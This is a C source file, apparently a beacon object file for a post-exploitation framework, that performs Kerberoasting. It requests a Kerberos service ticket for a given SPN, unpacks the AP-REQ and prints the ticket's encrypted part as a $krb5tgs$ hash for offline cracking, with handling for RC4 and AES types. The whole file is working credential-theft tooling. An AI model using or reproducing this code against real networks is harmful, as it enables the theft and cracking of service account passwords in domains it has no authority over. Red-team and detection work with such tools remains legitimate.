#include "kerberoast.h"
#include "tgtdeleg.h"

void execute_kerberoast(WCHAR** dispatch, char* spn) {
    PUCHAR apreq;
    ULONG apreqSize;
    PRINT(dispatch, "[*] Target SPN: %s\n", spn);
    LONG status = RequestApReq(spn, &apreq, &apreqSize, FALSE);
    if (status == 0) {
        PBYTE tokID = SearchOID(apreq, apreqSize);
        if (*(PUSHORT)tokID == 0x0001) {
            PKERB_AP_REQUEST apRequest;
            KERBERR kerbError;
            apreqSize -= (LONG)(tokID - (PBYTE)apreq);
            ASN1module_t module = KRB5_Module_Startup();
            if (module != NULL) {
                kerbError = KerbUnpackData(module, tokID + sizeof(SHORT), apreqSize, KERB_AP_REQUEST_PDU, &apRequest);
                if (KERB_SUCCESS(kerbError)) {
                    int encType = apRequest->ticket.encrypted_part.encryption_type;
                    int cipherTextSize = apRequest->ticket.encrypted_part.cipher_text.length;
                    UCHAR* cipherText = apRequest->ticket.encrypted_part.cipher_text.value;
                    KERB_PRINCIPAL_NAME_name_string_Seq service = apRequest->ticket.server_name.name_string->value;
                    KERB_PRINCIPAL_NAME_name_string_Seq host = apRequest->ticket.server_name.name_string->next->value;
                    KERB_REALM domain = apRequest->ticket.realm;

                    if (encType == 17 || encType == 18) {
                        PRINT(dispatch, "[*] Note: Specify valid username instead of 'USER'\n");
                        PRINT(dispatch, "[+] Hash: ");
                        PRINT(dispatch, "$krb5tgs$%d$USER$%s$*%s/%s*$", encType, domain, service, host);
                        for (int i = cipherTextSize - 12; i < cipherTextSize; i++) {
                            PRINT(dispatch, "%.2x", cipherText[i]);
                        }
                        PRINT(dispatch, "$");
                        for (int i = 0; i < cipherTextSize - 12; i++) {
                            PRINT(dispatch, "%.2x", cipherText[i]);
                        }
                        PRINT(dispatch, "\n");
                    } else if (encType == 23) {
                        PRINT(dispatch, "[+] Hash: ");
                        PRINT(dispatch, "$krb5tgs$%d$*$%s$%s/%s*$", encType, domain, service, host);
                        for (int i = 0; i < cipherTextSize; i++) {
                            if (i == 16) {
                                PRINT(dispatch, "$");
                            }
                            PRINT(dispatch, "%.2x", cipherText[i]);
                        }
                        PRINT(dispatch, "\n");
                    } else {
                        PRINT(dispatch, "[!] Unsupported encryption type: %s\n", GetEncryptionTypeString(encType));
                    }
                    KerbFreeData(module, KERB_AP_REQUEST_PDU, apRequest);
                } else {
                    PRINT(dispatch, "[!] Failed to unpack AP-REQ: 0x%x\n", kerbError);
                }
                KRB5_Module_Cleanup(module);
            } else {
                PRINT(dispatch, "[!] Could not create ASN.1 module\n");
            }
            MSVCRT$free(apreq);
        } else {
            PRINT(dispatch, "[!] Kerberos OID not found\n");
        }
    } else {
        PRINT(dispatch, "[!] Failed to request AP-REQ: 0x%x\n", status);
    }
}